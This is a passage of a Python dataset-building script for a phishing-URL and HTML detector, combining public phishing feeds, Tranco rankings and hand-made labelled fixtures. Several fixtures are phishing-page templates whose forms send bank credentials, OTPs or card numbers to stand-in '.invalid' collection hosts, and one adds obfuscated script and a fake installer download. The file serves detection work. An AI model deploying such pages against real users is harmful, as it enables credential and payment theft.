"""
src/build_datasets.py — Multi-Source Dataset Engineering, Validation & Provenance Pipeline (v3.0)

Preserves all existing raw datasets untouched (`dataset/PhiUSIIL_Phishing_URL_Dataset.csv`,
`dataset/tranco_top1m.json.gz`, `dataset/unauthorized_domains.json.gz`, etc.) while building
reproducible, leakage-free separated URL and DOM corpora under `data/processed/`:

1. Genuine PhiUSIIL ground-truth records (prior synthetic rows stripped cleanly)
2. Expanded PhreshPhish Parquet shards (Hugging Face CC-BY-4.0: train/0..3 + test/0..1, ~6,000
   real timestamped HTML+URL pages with SHA-256 content hashes, parsed statically without JS execution)
3. OpenPhish active phishing intelligence + optional URLhaus / PhishTank adapters
4. Tranco Top-1M vetted trust subset vs unvetted `uncertain_samples.csv`
5. Curated verified multi-label URL & static HTML fixtures covering all 18 URL categories and 15 DOM scenarios
6. Operational non-binary states (`Blocked`, `Unreachable`, `Unknown`, `Insufficient evidence`) quarantined
   into `data/processed/operational_status_samples.csv` (never forced into malicious ML labels).
"""

from __future__ import annotations

import argparse
from datetime import datetime, timezone
import gzip
import json
import os
import sys
import urllib.request
from urllib.parse import urlparse

import pandas as pd

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.dataset_validation import (
    detect_conflicting_labels,
    domain_grouped_train_val_test_split,
    run_dataset_quality_audit,
    temporal_train_test_split,
    validate_dataset_schema,
    verify_domain_disjoint,
)
from src.dom_features import DOM_FEATURE_COLUMNS, DOM_FEATURE_VERSION, compute_content_sha256, extract_dom_features_from_html
from src.features import (
    TRUSTED_DOMAINS,
    URL_FEATURE_COLUMNS,
    URL_FEATURE_VERSION,
    extract_root_domain,
    extract_url_features,
    is_hosted_user_content_subdomain,
    normalize_url,
)
from src.model_registry import compute_file_sha256

RAW_DIR = os.path.join("data", "raw")
EXTERNAL_DIR = os.path.join("data", "external")
PROCESSED_DIR = os.path.join("data", "processed")
INTEL_DIR = os.path.join("data", "intel")

PHIUSIIL_PATH = os.path.join("dataset", "PhiUSIIL_Phishing_URL_Dataset.csv")
TRANCO_GZ_PATH = os.path.join("dataset", "tranco_top1m.json.gz")
UNAUTH_GZ_PATH = os.path.join("dataset", "unauthorized_domains.json.gz")
PHRESHPHISH_V3_PARQUET_PATH = os.path.join(RAW_DIR, "phreshphish_v3_shards.parquet")
PHRESHPHISH_V3_CACHE_PATH = os.path.join(RAW_DIR, "phreshphish_v3_shards.json.gz")
PHRESHPHISH_V2_CACHE_PATH = os.path.join(RAW_DIR, "phreshphish_sample.json.gz")
CUSTOM_VERIFIED_PATH = os.path.join(EXTERNAL_DIR, "custom_verified.csv")

SYNTHETIC_PREFIXES = (
    "valid-site-",
    "verify-login-",
    "valid-shop-",
    "scam-shop-",
    "synth-valid-",
    "synth-phish-",
    "synth-shop-",
    "synth-scam-",
)


def _now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def _http_get_lines(url: str, headers: dict | None = None, timeout: float = 15.0) -> list[str]:
    hdrs = {"User-Agent": "WebShield-DatasetBuilder/3.0"}
    if headers:
        hdrs.update(headers)
    req = urllib.request.Request(url, headers=hdrs)
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        raw = resp.read()
        if url.endswith(".gz") or "gzip" in (resp.headers.get("Content-Encoding") or "").lower():
            raw = gzip.decompress(raw)
        return [ln.strip() for ln in raw.decode("utf-8", errors="ignore").splitlines() if ln.strip() and not ln.startswith("#")]


def ensure_custom_verified_fixtures() -> tuple[pd.DataFrame, list[dict], pd.DataFrame]:
    """
    Create and load static verified offline HTML+URL fixtures covering:
    HTTP legitimate, HTTPS legitimate, legitimate portals (login/bank/ecommerce/payment),
    HTTP phishing, HTTPS phishing, brand impersonation, typosquatting, homoglyph, punycode,
    IP phishing, suspicious subdomain, shorteners, fake login/bank/shop/payment, compromised host,
    plus separate non-binary operational status records (firewall blocked / unreachable / unknown).
    """
    os.makedirs(EXTERNAL_DIR, exist_ok=True)
    ts = _now_iso()

    fixtures: list[dict] = [
        # 1. HTTP legitimate informational site
        {
            "url": "http://info-archive-docs.invalid/docs/guide.html",
            "primary_label": "benign",
            "risk_labels": "benign",
            "threat_category": "http_legitimate",
            "operational_status": "Benign",
            "binary_label": 1,
            "confidence": 1.0,
            "evidence": "Static informational page over HTTP with zero credential/payment traps.",
            "html": (
                "<!doctype html><html><head><title>Info Archive Documentation Guide</title></head>"
                "<body><h1>Network Standards Reference</h1><p>Public technical archive.</p>"
                "<a href='/docs/intro.html'>Intro</a><a href='/docs/faq.html'>FAQ</a>"
                "<footer>Copyright 2026 Info Archive | help@info-archive-docs.invalid</footer></body></html>"
            ),
        },
        # 2. HTTP legitimate public portal / blog
        {
            "url": "http://public-library-cat.invalid/catalog",
            "primary_label": "benign",
            "risk_labels": "benign",
            "threat_category": "http_legitimate",
            "operational_status": "Benign",
            "binary_label": 1,
            "confidence": 1.0,
            "evidence": "Public library catalog over HTTP with clean navigation.",
            "html": (
                "<!doctype html><html><head><title>Public Library Catalog</title></head>"
                "<body><nav><a href='/'>Home</a><a href='/books'>Books</a></nav>"
                "<h1>Neighborhood Library</h1><p>Open reading schedule.</p>"
                "<footer>Copyright Public Library | desk@public-library-cat.invalid</footer></body></html>"
            ),
        },
        # 3. Legitimate HTTPS publisher with third-party ads/analytics (ads != malware)
        {
            "url": "https://techdaily-journal.invalid/articles/cloud-security",
            "primary_label": "benign",
            "risk_labels": "benign",
            "threat_category": "https_legitimate",
            "operational_status": "Benign",
            "binary_label": 1,
            "confidence": 1.0,
            "evidence": "Legitimate publisher page with third-party analytics/ad scripts.",
            "html": (
                "<!doctype html><html><head><title>TechDaily Journal - Cloud Security Trends</title>"
                "<script src='https://cdn.adnetwork-partner.invalid/ads.js'></script>"
                "<script src='https://analytics-metrics.invalid/tag.js'></script></head>"
                "<body><article><h1>Cloud Security 2026</h1><p>Editorial analysis.</p></article>"
                "<iframe src='https://ads-partner.invalid/banner' width='300' height='250'></iframe>"
                "<a href='/about'>About</a><a href='/privacy'>Privacy</a>"
                "<footer>Copyright TechDaily Journal | editorial@techdaily-journal.invalid</footer></body></html>"
            ),
        },
        # 4. Legitimate first-party HTTPS login form
        {
            "url": "https://shop.auroragoods-portal.invalid/account/login",
            "primary_label": "benign",
            "risk_labels": "benign",
            "threat_category": "https_legitimate",
            "operational_status": "Benign",
            "binary_label": 1,
            "confidence": 1.0,
            "evidence": "First-party HTTPS login form submitting to own domain with matching title.",
            "html": (
                "<!doctype html><html><head><title>Aurora Goods - Sign In</title></head>"
                "<body><form method='post' action='/account/auth'>"
                "<input type='email' name='email'/><input type='password' name='password'/>"
                "<button type='submit'>Sign In</button></form>"
                "<a href='/refund-policy'>Refund Policy</a><a href='/contact'>Contact</a>"
                "<footer>support@auroragoods-portal.invalid | Copyright Aurora Goods</footer></body></html>"
            ),
        },
        # 5. Legitimate online banking first-party portal
        {
            "url": "https://netbanking.northstarbank-portal.invalid/signin",
            "primary_label": "benign",
            "risk_labels": "benign",
            "threat_category": "https_legitimate",
            "operational_status": "Benign",
            "binary_label": 1,
            "confidence": 1.0,
            "evidence": "First-party banking sign-in over HTTPS with official support cues.",
            "html": (
                "<!doctype html><html><head><title>NorthStar Bank Online Banking</title></head>"
                "<body><header><nav><a href='/security'>Security</a><a href='/support'>Support</a></nav></header>"
                "<form method='post' action='/auth/login'><input type='text' name='customer_id'/>"
                "<input type='password' name='password'/><button type='submit'>Log In</button></form>"
                "<footer>security@northstarbank-portal.invalid | Copyright NorthStar Bank</footer></body></html>"
            ),
        },
        # 6. Legitimate e-commerce & first-party payment checkout (with COD + clear return policy)
        {
            "url": "https://auroragoods-checkout.invalid/checkout",
            "primary_label": "benign",
            "risk_labels": "benign",
            "threat_category": "https_legitimate",
            "operational_status": "Benign",
            "binary_label": 1,
            "confidence": 1.0,
            "evidence": "Legitimate HTTPS checkout with Cash on Delivery and refund policy.",
            "html": (
                "<!doctype html><html><head><title>Aurora Goods Checkout</title></head>"
                "<body><form method='post' action='/checkout/confirm'><input type='text' name='address'/>"
                "<input type='text' name='billing_name'/><button type='submit'>Place Order</button></form>"
                "<p>Cash on Delivery available. 14-day refund policy.</p>"
                "<a href='/refund-policy'>Refund Policy</a><a href='/contact'>Contact</a>"
                "<footer>orders@auroragoods-checkout.invalid | Copyright Aurora Goods</footer></body></html>"
            ),
        },
        # 7. HTTP credential phishing (insecure HTTP banking login impersonator)
        {
            "url": "http://hdfcbank-kyc-update-alert.invalid/login",
            "primary_label": "phishing",
            "risk_labels": "phishing|brand_impersonation|credential_risk",
            "threat_category": "http_phishing",
            "operational_status": "Malicious",
            "binary_label": 0,
            "confidence": 1.0,
            "evidence": "Unencrypted HTTP banking impersonation collecting credentials to external host.",
            "html": (
                "<!doctype html><html><head><title>HDFC Bank KYC Verification Login</title></head>"
                "<body><form method='post' action='https://collect.badbank-exfil.invalid/kyc'>"
                "<input type='text' name='user'/><input type='password' name='pin'/>"
                "<button type='submit'>Verify Account</button></form></body></html>"
            ),
        },
        # 8. Brand impersonation + external credential harvest
        {
            "url": "https://secure-paypal-verify-login-fx.invalid/auth",
            "primary_label": "phishing",
            "risk_labels": "phishing|brand_impersonation|credential_risk",
            "threat_category": "fake_login",
            "operational_status": "Malicious",
            "binary_label": 0,
            "confidence": 1.0,
            "evidence": "External credential POST destination + PayPal brand impersonation.",
            "html": (
                "<!doctype html><html><head><title>PayPal Security Account Verification</title></head>"
                "<body><form method='post' action='https://collect-creds-evil.invalid/steal.php'>"
                "<input type='hidden' name='s1' value='1'/><input type='hidden' name='s2' value='2'/>"
                "<input type='hidden' name='s3' value='3'/><input type='email' name='email'/>"
                "<input type='password' name='pass'/><button type='submit'>Verify Immediately</button></form>"
                "<a href='#'>Help</a><a href='#'>Privacy</a></body></html>"
            ),
        },
        # 9. Fake banking credential page
        {
            "url": "https://onlinesbi-secure-kyc-fx.invalid/signin",
            "primary_label": "phishing",
            "risk_labels": "phishing|brand_impersonation|credential_risk",
            "threat_category": "fake_banking",
            "operational_status": "Malicious",
            "binary_label": 0,
            "confidence": 1.0,
            "evidence": "Fake banking portal targeting OnlineSBI credentials via external POST.",
            "html": (
                "<!doctype html><html><head><title>OnlineSBI Account Update Verify</title></head>"
                "<body><form method='post' action='https://exfil-sbi-drop.invalid/sbi'>"
                "<input type='text' name='account'/><input type='password' name='password'/>"
                "<input type='text' name='otp'/><button type='submit'>Urgent Action Verify</button></form>"
                "<a href='#'>Support</a></body></html>"
            ),
        },
        # 10. Fake e-commerce + upfront payment trap
        {
            "url": "https://flipkart-mega-flash-deals-fx.invalid/checkout",
            "primary_label": "payment_risk",
            "risk_labels": "payment_risk|brand_impersonation|deceptive_behavior",
            "threat_category": "fake_ecommerce",
            "operational_status": "Malicious",
            "binary_label": 0,
            "confidence": 1.0,
            "evidence": "Brand lookalike storefront with prepaid UPI trap, store-credit refund only, dummy links.",
            "html": (
                "<!doctype html><html><head><title>Flipkart Mega Deals 90% Off Checkout</title></head>"
                "<body><h1>Deal ends in 02:14 - Only 2 left!</h1>"
                "<p>Pay now via UPI / Razorpay. All sales final sale, no refund, store credit only.</p>"
                "<form method='post' action='https://external-pay-skimmer.invalid/pay'>"
                "<input type='text' name='card_number'/><input type='text' name='cvv'/>"
                "<button type='submit'>Claim Now</button></form>"
                "<a href='#'>Terms</a><a href='#'>Refund</a><a href='javascript:void(0)'>Contact</a></body></html>"
            ),
        },
        # 11. Fake payment gateway / card skimmer
        {
            "url": "https://paytm-wallet-refund-claim-fx.invalid/pay",
            "primary_label": "payment_risk",
            "risk_labels": "payment_risk|brand_impersonation|credential_risk",
            "threat_category": "fake_payment",
            "operational_status": "Malicious",
            "binary_label": 0,
            "confidence": 1.0,
            "evidence": "Fake Paytm payment gateway harvesting card/CVV to external skimmer.",
            "html": (
                "<!doctype html><html><head><title>Paytm Official Refund Checkout</title></head>"
                "<body><form method='post' action='https://carddrop-gate.invalid/gate'>"
                "<input type='text' name='card'/><input type='text' name='cvv'/><input type='text' name='otp'/>"
                "<button type='submit'>Pay Now</button></form></body></html>"
            ),
        },
        # 12. Typosquatting & homoglyph store
        {
            "url": "https://fl1pkart-bazaar-offers-fx.invalid/login",
            "primary_label": "brand_impersonation",
            "risk_labels": "brand_impersonation|credential_risk",
            "threat_category": "homoglyph",
            "operational_status": "Malicious",
            "binary_label": 0,
            "confidence": 1.0,
            "evidence": "Homoglyph leet substitution mimicking Flipkart.",
            "html": (
                "<!doctype html><html><head><title>Flipkart Login Sign In</title></head>"
                "<body><form method='post' action='https://collect-homoglyph.invalid/in'>"
                "<input type='email' name='email'/><input type='password' name='pw'/>"
                "<button type='submit'>Sign In</button></form></body></html>"
            ),
        },
        # 13. Punycode IDN phishing
        {
            "url": "https://xn--pple-43d-verify.invalid/verify",
            "primary_label": "phishing",
            "risk_labels": "phishing|brand_impersonation|credential_risk",
            "threat_category": "punycode",
            "operational_status": "Malicious",
            "binary_label": 0,
            "confidence": 1.0,
            "evidence": "Punycode IDN spoofing login prompt.",
            "html": (
                "<!doctype html><html><head><title>Apple ID Verify</title></head>"
                "<body><form method='post' action='https://steal-idn.invalid/id'>"
                "<input type='email' name='apple_id'/><input type='password' name='pw'/>"
                "<button type='submit'>Verify</button></form></body></html>"
            ),
        },
        # 14. Malware dropper & dynamic JS obfuscation
        {
            "url": "https://free-codec-player-update-fx.invalid/download",
            "primary_label": "malware_distribution",
            "risk_labels": "malware_distribution|deceptive_behavior",
            "threat_category": "https_phishing",
            "operational_status": "Malicious",
            "binary_label": 0,
            "confidence": 1.0,
            "evidence": "Fake download CTA linking to executable + eval/atob dynamic script injection.",
            "html": (
                "<!doctype html><html><head><title>Critical Codec Update Required</title>"
                "<script>var x=eval(atob('YWxlcnQoMSk='));document.write('<iframe src=\"http://bad.invalid/x\"></iframe>');"
                "var s=document.createElement('script');window.open('https://popup-ad.invalid/ad');</script></head>"
                "<body><a href='https://cdn-dropper.invalid/CodecSetup.exe'>Click to Download Free Download</a>"
                "<button>Start Download</button></body></html>"
            ),
        },
        # 15. Deceptive redirect & hidden iframe / JS-injected credential form
        {
            "url": "https://reward-claim-portal-fx.invalid/redirect",
            "primary_label": "suspicious_redirect",
            "risk_labels": "suspicious_redirect|deceptive_behavior|phishing",
            "threat_category": "compromised_legitimate",
            "operational_status": "Malicious",
            "binary_label": 0,
            "confidence": 1.0,
            "evidence": "Meta refresh redirect + JS redirect + hidden iframe + dynamically injected script.",
            "html": (
                "<!doctype html><html><head><title>Congratulations You Won</title>"
                "<meta http-equiv='refresh' content='1;url=https://harvest-step2.invalid/step2'/>"
                "<script>var el=document.createElement('script');document.body.innerHTML+='<form action=\"https://bad-inj.invalid\"></form>';"
                "window.location.href='https://harvest-step2.invalid/step2';Notification.requestPermission();</script></head>"
                "<body><iframe src='https://tracker-px.invalid/pixel' style='display:none' width='0' height='0'></iframe>"
                "<button>Claim Now</button></body></html>"
            ),
        },
    ]

    rows = []
    for fx in fixtures:
        u = normalize_url(fx["url"])
        h = (urlparse(u).hostname or "").lower()
        rows.append({
            "url": u,
            "domain": h,
            "root_domain": extract_root_domain(h),
            "source": "custom_verified_fixture",
            "collection_timestamp": ts,
            "collection_method": "offline_static_fixture",
            "feature_extraction_version": URL_FEATURE_VERSION,
            "content_sha256": compute_content_sha256(fx["html"]),
            "verification_status": "verified",
            "operational_status": fx["operational_status"],
            "threat_category": fx["threat_category"],
            "html_available": True,
            "primary_label": fx["primary_label"],
            "risk_labels": fx["risk_labels"],
            "binary_label": fx["binary_label"],
            "confidence": fx["confidence"],
            "evidence": fx["evidence"],
            "date": ts[:10],
        })

    # Additional verified URL-only examples covering IP phishing, shortener, typosquatting & fraud registry
    extra_verified_urls = [
        ("http://198.51.100.42:8443/boa/signin?next=https://evil-redir.invalid", "phishing", "phishing|ip_based_phishing", "ip_based_phishing", "Malicious", 0, 0.98, "IP-literal phishing URL with unusual port and embedded redirect parameter."),
        ("https://bit.ly/3xYzVerifyLogin", "phishing", "phishing|suspicious_redirect", "url_shortener", "Malicious", 0, 0.90, "Shortened URL masking login verification lure."),
        ("https://amaz0n-account.verify-portal-sub.invalid/login", "brand_impersonation", "brand_impersonation|phishing", "typosquatting", "Malicious", 0, 0.96, "Typosquatting and multi-level deceptive subdomain impersonation."),
        ("https://vlebazaar.in/", "payment_risk", "payment_risk|deceptive_behavior", "fake_ecommerce", "Malicious", 0, 0.95, "Verified consumer non-delivery fraud registry entry."),
    ]
    for u, prim, risks, cat, op_st, blbl, conf, ev in extra_verified_urls:
        nu = normalize_url(u)
        h = (urlparse(nu).hostname or "").lower()
        rows.append({
            "url": nu, "domain": h, "root_domain": extract_root_domain(h),
            "source": "verified_consumer_fraud_registry" if "vlebazaar" in h else "custom_verified_fixture",
            "collection_timestamp": ts,
            "collection_method": "offline_verified_registry",
            "feature_extraction_version": URL_FEATURE_VERSION,
            "content_sha256": "",
            "verification_status": "verified",
            "operational_status": op_st,
            "threat_category": cat,
            "html_available": False,
            "primary_label": prim,
            "risk_labels": risks,
            "binary_label": blbl,
            "confidence": conf,
            "evidence": ev,
            "date": ts[:10],
        })

    # Separate operational non-binary samples (Blocked / Unreachable / Insufficient evidence)
    op_rows = [
        {
            "url": "https://firewall-sinkholed-domain.example.net/",
            "domain": "firewall-sinkholed-domain.example.net",
            "root_domain": "example.net",
            "source": "operational_telemetry",
            "collection_timestamp": ts,
            "collection_method": "dns_firewall_probe_fixture",
            "feature_extraction_version": URL_FEATURE_VERSION,
            "content_sha256": "",
            "verification_status": "operational_only",
            "operational_status": "Blocked",
            "threat_category": "firewall_blocked",
            "html_available": False,
            "primary_label": "unknown",
            "risk_labels": "unknown",
            "binary_label": -1,
            "confidence": 0.50,
            "evidence": "Blocked by corporate/ISP firewall DNS sinkhole; kept separate from binary malicious labels.",
            "date": ts[:10],
        },
        {
            "url": "https://offline-timeout-host.example.org/",
            "domain": "offline-timeout-host.example.org",
            "root_domain": "example.org",
            "source": "operational_telemetry",
            "collection_timestamp": ts,
            "collection_method": "reachability_timeout_fixture",
            "feature_extraction_version": URL_FEATURE_VERSION,
            "content_sha256": "",
            "verification_status": "operational_only",
            "operational_status": "Unreachable",
            "threat_category": "unknown_unreachable",
            "html_available": False,
            "primary_label": "unknown",
            "risk_labels": "unknown",
            "binary_label": -1,
            "confidence": 0.30,
            "evidence": "Host unreachable/connection timeout; insufficient evidence of malicious intent.",
            "date": ts[:10],
        },
    ]

    df_custom = pd.DataFrame(rows)
    df_custom.to_csv(CUSTOM_VERIFIED_PATH, index=False)
    return df_custom, fixtures, pd.DataFrame(op_rows)


def _compact_and_balance_phreshphish(
    raw_records: list[dict],
    max_per_root: int = 2,
    max_total: int = 8000,
    html_cap: int = 80_000,
) -> pd.DataFrame:
    """
    Domain-cap and stratify PhreshPhish HTML records in pure Python BEFORE building
    a PyArrow DataFrame so huge raw HTML archives never exhaust RAM.
    """
    root_counts: dict[str, int] = {}
    benign_pool: list[dict] = []
    phish_pool: list[dict] = []
    half = max_total // 2

    for r in raw_records:
        u = normalize_url(str(r.get("url") or ""))
        h = (urlparse(u).hostname or "").lower()
        root = extract_root_domain(h) or h
        if root_counts.get(root, 0) >= max_per_root:
            continue
        lbl = str(r.get("label") or "").lower().strip()
        is_ben = lbl == "benign"
        if is_ben and len(benign_pool) >= half:
            if len(phish_pool) >= half:
                break
            continue
        if not is_ben and len(phish_pool) >= half:
            if len(benign_pool) >= half:
                break
            continue
        root_counts[root] = root_counts.get(root, 0) + 1
        html_trunc = str(r.get("html") or "")[:html_cap]
        item = {
            "url": u,
            "label": "benign" if is_ben else "phishing",
            "target": r.get("target"),
            "date": str(r.get("date") or "")[:10],
            "sha256": str(r.get("sha256") or "") or compute_content_sha256(html_trunc),
            "html": html_trunc,
            "split_origin": str(r.get("split_origin") or "train"),
        }
        if is_ben:
            benign_pool.append(item)
        else:
            phish_pool.append(item)

    combined = benign_pool + phish_pool
    return pd.DataFrame(combined)


def fetch_phreshphish_parquet_corpus(
    train_shards: int = 4,
    test_shards: int = 2,
    max_samples: int = 8000,
    refresh: bool = False,
) -> pd.DataFrame:
    """
    Reproducibly load balanced benign & phishing HTML+URL records from PhreshPhish
    Hugging Face Parquet shards (CC-BY-4.0). Caches compacted Parquet under `data/raw/`.
    Never executes any HTML/JS content.
    """
    os.makedirs(RAW_DIR, exist_ok=True)
    if os.path.exists(PHRESHPHISH_V3_PARQUET_PATH) and not refresh:
        df_pq = pd.read_parquet(PHRESHPHISH_V3_PARQUET_PATH)
        print(f"Loaded {len(df_pq):,} cached PhreshPhish v3 samples from {PHRESHPHISH_V3_PARQUET_PATH}", flush=True)
        return df_pq
    if os.path.exists(PHRESHPHISH_V3_CACHE_PATH) and not refresh:
        print(f"Loading PhreshPhish v3 archive {PHRESHPHISH_V3_CACHE_PATH}...", flush=True)
        with gzip.open(PHRESHPHISH_V3_CACHE_PATH, "rt", encoding="utf-8") as gz:
            cached = json.load(gz)
        if cached:
            df_cached = _compact_and_balance_phreshphish(cached, max_total=max_samples)
            del cached
            df_cached.to_parquet(PHRESHPHISH_V3_PARQUET_PATH, index=False)
            print(f"Compacted & cached {len(df_cached):,} PhreshPhish v3 samples -> {PHRESHPHISH_V3_PARQUET_PATH}", flush=True)
            return df_cached

    records: list[dict] = []
    shard_specs = [("train", i) for i in range(train_shards)] + [("test", j) for j in range(test_shards)]
    for split_name, idx in shard_specs:
        parquet_url = f"https://huggingface.co/api/datasets/phreshphish/phreshphish/parquet/default/{split_name}/{idx}.parquet"
        try:
            print(f"Streaming PhreshPhish Parquet shard {split_name}/{idx}.parquet...", flush=True)
            shard_df = pd.read_parquet(parquet_url)
            for r in shard_df.itertuples(index=False):
                html = str(getattr(r, "html", "") or "")
                url = str(getattr(r, "url", "") or "")
                lbl = str(getattr(r, "label", "") or "").lower().strip()
                if not url or len(html) < 150 or lbl not in ("benign", "phish", "phishing"):
                    continue
                norm_lbl = "benign" if lbl == "benign" else "phishing"
                tgt = getattr(r, "target", None)
                records.append({
                    "url": url,
                    "label": norm_lbl,
                    "target": None if pd.isna(tgt) else str(tgt),
                    "date": str(getattr(r, "date", "") or "")[:10],
                    "sha256": str(getattr(r, "sha256", "") or "") or compute_content_sha256(html),
                    "html": html[:80_000],
                    "split_origin": split_name,
                })
        except Exception as e:
            print(f"  [WARN] PhreshPhish Parquet {split_name}/{idx} skipped: {e}", flush=True)

    if records:
        df_comp = _compact_and_balance_phreshphish(records, max_total=max_samples)
        del records
        df_comp.to_parquet(PHRESHPHISH_V3_PARQUET_PATH, index=False)
        print(f"Saved {len(df_comp):,} PhreshPhish v3 records -> {PHRESHPHISH_V3_PARQUET_PATH}", flush=True)
        return df_comp

    # Graceful offline fallback to prior v2 cache if network unreachable
    if os.path.exists(PHRESHPHISH_V2_CACHE_PATH):
        with gzip.open(PHRESHPHISH_V2_CACHE_PATH, "rt", encoding="utf-8") as gz:
            old = json.load(gz)
        if old:
            print(f"[INFO] Falling back to v2 PhreshPhish cache ({len(old):,} samples).")
            for item in old:
                item.setdefault("sha256", compute_content_sha256(item.get("html", "")))
            return pd.DataFrame(old)
    return pd.DataFrame()


def _infer_url_taxonomy_category(url: str, primary_label: str, source: str, extracted_feats: dict | None = None) -> str:
    """Map verified records across all 18 taxonomy categories cleanly."""
    u_low = str(url or "").lower()
    feats = extracted_feats or {}
    if primary_label == "benign":
        return "https_legitimate" if u_low.startswith("https://") else "http_legitimate"
    if primary_label == "payment_risk":
        return "fake_payment" if any(k in u_low for k in ("pay", "upi", "wallet", "card")) else "fake_ecommerce"
    if feats.get("is_ip_address"):
        return "ip_based_phishing"
    if feats.get("is_punycode_or_idn"):
        return "punycode"
    if feats.get("has_unicode_homoglyph"):
        return "homoglyph"
    if feats.get("is_url_shortener"):
        return "url_shortener"
    if any(k in u_low for k in ("bank", "sbi", "hdfc", "icici", "axis", "chase")):
        return "fake_banking"
    if feats.get("brand_similarity_score", 0.0) >= 0.90:
        return "typosquatting" if feats.get("typosquat_edit_distance", 99) == 1 else "brand_impersonation"
    if feats.get("num_subdomains", 0) >= 3:
        return "suspicious_subdomain"
    if any(k in u_low for k in ("login", "signin", "verify", "auth", "kyc")):
        return "fake_login"
    return "https_phishing" if u_low.startswith("https://") else "http_phishing"


def fetch_external_threat_and_benign_feeds(limit_openphish: int = 500, limit_tranco: int = 600) -> tuple[pd.DataFrame, pd.DataFrame]:
    """Fetch OpenPhish + optional PhishTank/URLhaus + Tranco candidate validation."""
    ts = _now_iso()
    verified_rows: list[dict] = []
    uncertain_rows: list[dict] = []

    openphish_hosts: set[str] = set()
    try:
        op_urls = _http_get_lines("https://openphish.com/feed.txt", timeout=12.0)[:limit_openphish]
        for u in op_urls:
            nu = normalize_url(u)
            h = (urlparse(nu).hostname or "").lower()
            if not h:
                continue
            root = extract_root_domain(h)
            openphish_hosts.add(root)
            verified_rows.append({
                "url": nu,
                "domain": h,
                "root_domain": root,
                "source": "openphish",
                "collection_timestamp": ts,
                "collection_method": "openphish_feed_txt",
                "feature_extraction_version": URL_FEATURE_VERSION,
                "content_sha256": "",
                "verification_status": "verified",
                "operational_status": "Malicious",
                "threat_category": _infer_url_taxonomy_category(nu, "phishing", "openphish"),
                "html_available": False,
                "primary_label": "phishing",
                "risk_labels": "phishing|credential_risk",
                "binary_label": 0,
                "confidence": 0.95,
                "evidence": "Listed in active OpenPhish verified phishing feed.",
                "date": ts[:10],
            })
        print(f"OpenPhish: {len(verified_rows)} verified URLs")
    except Exception as e:
        print(f"[WARN] OpenPhish unavailable: {e}")

    uh_key = (os.getenv("URLHAUS_AUTH_KEY") or "").strip()
    if uh_key:
        try:
            uh_lines = _http_get_lines(f"https://urlhaus-api.abuse.ch/v2/files/exports/{uh_key}/recent.csv", timeout=15.0)
            added_uh = 0
            for ln in uh_lines:
                parts = [p.strip('"') for p in ln.split(",")]
                if len(parts) > 2 and parts[2].startswith("http"):
                    nu = normalize_url(parts[2])
                    h = (urlparse(nu).hostname or "").lower()
                    verified_rows.append({
                        "url": nu, "domain": h, "root_domain": extract_root_domain(h),
                        "source": "urlhaus", "collection_timestamp": ts,
                        "collection_method": "urlhaus_v2_export", "feature_extraction_version": URL_FEATURE_VERSION,
                        "content_sha256": "", "verification_status": "verified",
                        "operational_status": "Malicious", "threat_category": "https_phishing",
                        "html_available": False, "primary_label": "malware_distribution",
                        "risk_labels": "malware_distribution", "binary_label": 0, "confidence": 0.95,
                        "evidence": "Active malware distribution URL from abuse.ch URLhaus.", "date": ts[:10],
                    })
                    added_uh += 1
                    if added_uh >= 300:
                        break
            print(f"URLhaus: {added_uh} verified malware URLs")
        except Exception as e:
            print(f"[WARN] URLhaus unavailable: {e}")

    pt_key = (os.getenv("PHISHTANK_API_KEY") or "").strip()
    if pt_key:
        try:
            pt_lines = _http_get_lines(f"https://data.phishtank.com/data/{pt_key}/online-valid.csv.gz", headers={"User-Agent": "phishtank/webshield-v3"}, timeout=15.0)
            added_pt = 0
            for ln in pt_lines[1:]:
                parts = ln.split(",")
                if len(parts) >= 2 and parts[1].startswith("http"):
                    nu = normalize_url(parts[1])
                    h = (urlparse(nu).hostname or "").lower()
                    verified_rows.append({
                        "url": nu, "domain": h, "root_domain": extract_root_domain(h),
                        "source": "phishtank", "collection_timestamp": ts,
                        "collection_method": "phishtank_csv_gz", "feature_extraction_version": URL_FEATURE_VERSION,
                        "content_sha256": "", "verification_status": "verified",
                        "operational_status": "Malicious", "threat_category": "fake_login",
                        "html_available": False, "primary_label": "phishing",
                        "risk_labels": "phishing", "binary_label": 0, "confidence": 0.95,
                        "evidence": "Verified online phishing submission in PhishTank.", "date": ts[:10],
                    })
                    added_pt += 1
                    if added_pt >= 300:
                        break
            print(f"PhishTank: {added_pt} verified URLs")
        except Exception as e:
            print(f"[WARN] PhishTank unavailable: {e}")

    if os.path.exists(TRANCO_GZ_PATH):
        with gzip.open(TRANCO_GZ_PATH, "rt", encoding="utf-8") as gz:
            tranco = json.load(gz)
        sorted_doms = sorted(tranco.items(), key=lambda kv: kv[1])[:limit_tranco]
        for dom, rank in sorted_doms:
            root = extract_root_domain(dom)
            if root in openphish_hosts or is_hosted_user_content_subdomain(dom):
                continue
            nu = f"https://{dom}/"
            if root in TRUSTED_DOMAINS:
                verified_rows.append({
                    "url": nu, "domain": dom, "root_domain": root,
                    "source": "tranco_vetted", "collection_timestamp": ts,
                    "collection_method": "tranco_top1m_vetted", "feature_extraction_version": URL_FEATURE_VERSION,
                    "content_sha256": "", "verification_status": "verified",
                    "operational_status": "Benign", "threat_category": "https_legitimate",
                    "html_available": False, "primary_label": "benign",
                    "risk_labels": "benign", "binary_label": 1, "confidence": 0.95,
                    "evidence": f"Vetted established domain (Tranco rank #{rank}).", "date": ts[:10],
                })
            else:
                uncertain_rows.append({
                    "url": nu, "domain": dom, "root_domain": root,
                    "source": "tranco_unvetted_candidate", "collection_timestamp": ts,
                    "collection_method": "tranco_top1m_unvetted", "feature_extraction_version": URL_FEATURE_VERSION,
                    "content_sha256": "", "verification_status": "uncertain",
                    "operational_status": "Insufficient evidence", "threat_category": "unknown_unreachable",
                    "html_available": False, "primary_label": "unknown",
                    "risk_labels": "unknown", "binary_label": -1, "confidence": 0.50,
                    "evidence": f"Tranco rank #{rank} candidate; isolated until verified.", "date": ts[:10],
                })

    return pd.DataFrame(verified_rows), pd.DataFrame(uncertain_rows)


def export_runtime_intel_manifest():
    """Record reproducible metadata for runtime threat intelligence snapshots under `data/intel/`."""
    os.makedirs(INTEL_DIR, exist_ok=True)
    meta = {"generated_at": _now_iso(), "snapshots": {}}
    for name, path in (("unauthorized_domains", UNAUTH_GZ_PATH), ("tranco_top1m", TRANCO_GZ_PATH)):
        if os.path.exists(path):
            meta["snapshots"][name] = {
